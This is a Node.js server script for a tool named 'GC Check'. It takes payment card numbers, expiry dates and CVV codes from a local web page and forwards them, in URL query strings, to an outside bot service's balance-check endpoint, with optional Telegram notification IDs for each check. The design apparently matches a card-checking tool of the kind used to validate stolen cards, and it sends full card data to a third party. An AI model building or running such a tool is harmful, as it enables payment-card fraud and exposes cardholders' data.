// Run this to start the site:  node run.js
// Set your API token: set API_TOKEN=your_token  (Windows)  or  API_TOKEN=your_token node run.js
// Then open: http://localhost:3000

import http from 'http';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = 3000;

// Load .env if exists
try {
  const envPath = path.join(__dirname, '.env');
  const env = await fs.readFile(envPath, 'utf-8');
  env.split('\n').forEach(line => {
    const eq = line.indexOf('=');
    if (eq > 0) {
      const key = line.slice(0, eq).trim();
      const val = line.slice(eq + 1).trim().replace(/^["']|["']$/g, '');
      if (key) process.env[key] = val;
    }
  });
} catch (e) {}

const API_TOKEN = process.env.API_TOKEN;
const TELEGRAM_BEFORE = process.env.TELEGRAM_ID_BEFORE_CHECK?.trim();
const TELEGRAM_AFTER = process.env.TELEGRAM_ID_AFTER_CHECK?.trim();
const API_URL = 'https://bot.pc.am/v3/checkBalance';

const HTML = await fs.readFile(path.join(__dirname, 'standalone', 'index.html'), 'utf-8');

async function checkBalance(number, month, year, cvv) {
  const params = new URLSearchParams({
    token: API_TOKEN || '',
    number: number.replace(/\s/g, ''),
    month: month.padStart(2, '0'),
    year: year,
    cvv: cvv
  });
  if (TELEGRAM_BEFORE) params.set('telegram_id_before_check', TELEGRAM_BEFORE);
  if (TELEGRAM_AFTER) params.set('telegram_id_after_check', TELEGRAM_AFTER);
  const url = API_URL + '?' + params.toString();
  const res = await fetch(url);
  const text = await res.text();
  try {
    return JSON.parse(text);
  } catch {
    return { raw: text, success: false, error: 'Invalid response from balance service' };
  }
}

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === 'POST' && req.url === '/api/check-balance') {
    let body = '';
    for await (const chunk of req) body += chunk;
    try {
      const { cardNumber, expiryMonth, expiryYear, cvv } = JSON.parse(body || '{}');
      if (!API_TOKEN) {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'API token not configured. Set API_TOKEN in .env' }));
        return;
      }
      const apiRes = await checkBalance(cardNumber || '', expiryMonth || '', expiryYear || '', cvv || '');
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(apiRes));
    } catch (err) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: err.message || 'Request failed' }));
    }
    return;
  }

  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(HTML);
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, () => {
  console.log('');
  console.log('  GC Check');
  console.log('  -------------------------');
  console.log('  Open: http://localhost:' + PORT);
  console.log('');
});
